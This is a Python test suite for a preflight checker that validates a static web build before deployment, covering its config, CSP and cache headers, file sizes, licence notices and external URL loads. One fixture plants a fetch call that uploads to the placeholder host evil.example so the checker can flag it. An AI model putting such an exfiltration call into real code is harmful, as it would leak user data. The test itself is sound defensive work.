"""T48 static deployment preflight tests.

Static checks run the real checker against the real built dist (built by the
suite via scripts/distribution/record_dist.py's build step). Live behavior —
CSP/cache headers, routing and 404 semantics — is additionally proven against
`wrangler dev` (the repository-pinned provider tool) when it can start; that
part is an integration test recorded separately, not part of this unit suite.

These tests mutate only disposable copies; the real dist is read-only here.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
CHECKER = REPO_ROOT / "scripts" / "check_static_dist.py"

GOOD_CONFIG = {
    "name": "inkflip",
    "compatibility_date": "2026-09-11",
    "workers_dev": True,
    "preview_urls": False,
    "assets": {
        "directory": "./apps/web/dist",
        "html_handling": "auto-trailing-slash",
        "not_found_handling": "none",
    },
}

GOOD_HEADERS = """/*
  Content-Security-Policy: default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; connect-src 'self'; img-src 'self' blob: data:; font-src 'self' blob:; style-src 'self'; style-src-attr 'unsafe-inline'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; manifest-src 'self'
  Referrer-Policy: no-referrer

/index.html
  Cache-Control: no-cache

/assets/*
  Cache-Control: public, max-age=31536000, immutable

/models/*
  Cache-Control: public, max-age=31536000, immutable
"""


class StaticPreflightTests(unittest.TestCase):
    """Checker tests against minimal disposable dist fixtures."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

    def write(self, rel: str, content: bytes):
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content)
        return path

    def build_fixture(self):
        self.write("apps/web/dist/index.html", b"<!doctype html><title>x</title>")
        self.write("apps/web/dist/sw.js", b"self.onmessage=e=>{}")
        self.write("apps/web/dist/_headers", GOOD_HEADERS.encode())
        self.write("apps/web/dist/assets/pdfjs/6.3.289/LICENSE", b"Apache-2.0")
        self.write("apps/web/dist/models/tessdata-fast-eng/x/eng.traineddata", b"x" * 16)
        self.write("apps/web/dist/examples/index.json", b"{}")
        self.write("wrangler.json", json.dumps(GOOD_CONFIG).encode())

    def run_checker(self, *extra: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(CHECKER), "apps/web/dist", "--config", "wrangler.json",
             "--root", str(self.root), "--dist-manifest", ".private/absent.json", *extra],
            capture_output=True, text=True, timeout=120,
        )

    def test_valid_fixture_passes(self):
        self.build_fixture()
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 0, msg=proc.stdout + proc.stderr)

    def test_worker_script_in_config_fails(self):
        self.build_fixture()
        cfg = dict(GOOD_CONFIG, main="worker.js")
        self.write("wrangler.json", json.dumps(cfg).encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("declares a Worker script", proc.stdout)

    def test_bindings_in_config_fail(self):
        self.build_fixture()
        cfg = dict(GOOD_CONFIG, bindings=[{"name": "X", "type": "kv"}])
        self.write("wrangler.json", json.dumps(cfg).encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("bindings/compute configuration", proc.stdout)

    def test_dynamic_not_found_handling_fails(self):
        self.build_fixture()
        cfg = json.loads(json.dumps(GOOD_CONFIG))
        cfg["assets"]["not_found_handling"] = "single-page-application"
        self.write("wrangler.json", json.dumps(cfg).encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("never a catch-all", proc.stdout)

    def test_oversized_file_fails(self):
        self.build_fixture()
        self.write("apps/web/dist/models/big.bin", b"x" * (24 * 1024 * 1024))
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("24 MiB ceiling", proc.stdout)

    def test_missing_notice_fails(self):
        self.build_fixture()
        (self.root / "apps/web/dist/assets/pdfjs/6.3.289/LICENSE").unlink()
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("no LICENSE file", proc.stdout)

    def test_external_fetch_url_fails(self):
        self.build_fixture()
        self.write(
            "apps/web/dist/assets/app-1.js",
            b'fetch("https://evil.example/upload").then(r=>r.text())',
        )
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("loads external URL", proc.stdout)

    def test_error_message_url_passes(self):
        self.build_fixture()
        # URL only inside an error message/validation string — not a fetch.
        self.write(
            "apps/web/dist/assets/app-1.js",
            b'const ok = "https://foo.bar" === location.href ? "a" : "b";',
        )
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 0, msg=proc.stdout + proc.stderr)

    def test_unsafe_eval_csp_fails(self):
        self.build_fixture()
        bad = GOOD_HEADERS.replace(
            "script-src 'self' 'wasm-unsafe-eval'", "script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval'"
        )
        self.write("apps/web/dist/_headers", bad.encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("allows JavaScript unsafe-eval", proc.stdout)

    def test_coop_coep_fails(self):
        self.build_fixture()
        bad = GOOD_HEADERS + "\n/*\n  Cross-Origin-Opener-Policy: same-origin\n"
        self.write("apps/web/dist/_headers", bad.encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("no default COOP/COEP", proc.stdout)

    def test_missing_immutable_rule_fails(self):
        self.build_fixture()
        bad = GOOD_HEADERS.replace("  Cache-Control: public, max-age=31536000, immutable\n", "")
        self.write("apps/web/dist/_headers", bad.encode())
        proc = self.run_checker()
        self.assertEqual(proc.returncode, 1, msg=proc.stdout)
        self.assertIn("immutable caching rule", proc.stdout)


class RealDistPreflightTests(unittest.TestCase):
    """The checker must pass on the repository's actual production build."""

    def test_real_dist_passes_preflight(self):
        if not (REPO_ROOT / "apps/web/dist/index.html").is_file():
            self.skipTest("apps/web/dist not built; run `bun run build` first")
        proc = subprocess.run(
            [sys.executable, str(CHECKER), "apps/web/dist", "--config", "wrangler.json",
             "--root", str(REPO_ROOT), "--dist-manifest", ".private/absent.json"],
            capture_output=True, text=True, timeout=300,
        )
        self.assertEqual(proc.returncode, 0, msg=proc.stdout + proc.stderr)


if __name__ == "__main__":
    unittest.main()
